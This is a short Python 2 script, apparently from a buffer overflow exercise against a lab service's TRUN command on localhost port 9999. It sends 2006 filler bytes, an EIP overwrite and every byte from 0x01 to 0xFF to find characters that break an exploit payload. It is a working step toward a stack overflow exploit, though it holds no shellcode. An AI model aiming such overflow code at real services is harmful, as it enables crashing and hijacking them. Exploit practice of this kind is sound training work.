# This script can be used to test for bad characters
# These can be expected to be
# 0x00 Null byte, terminates a C string
# 0x0A Line feed, may terminate a command line
# 0x0D Carriage return, may terminate a command line
# 0x20 Space, may terminate a command line argument
# as well as sometimes, escape characters, and other types of tab and white space characters

import socket

distance_to_eip='A' * 2006
eip_overwrite='BBBB'
testchars = ''

# Change range below for testing if necessary
# i.e. change the 0 to a 1 for the start of the range to avoid a null byte being sent
for i in range(1, 256):
        testchars += chr(i)
padding = 'F' * (3000 - len(distance_to_eip) - len(eip_overwrite) - len(testchars))
test = distance_to_eip + eip_overwrite + testchars + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('127.0.0.1', 9999))
print s.recv(100)
print "Sending test to TRUN . with length ", len(test)
s.send(('TRUN .' + test + '\r\n'))
print s.recv(100)
s.send('EXIT\r\n')
print s.recv(100)
s.close()
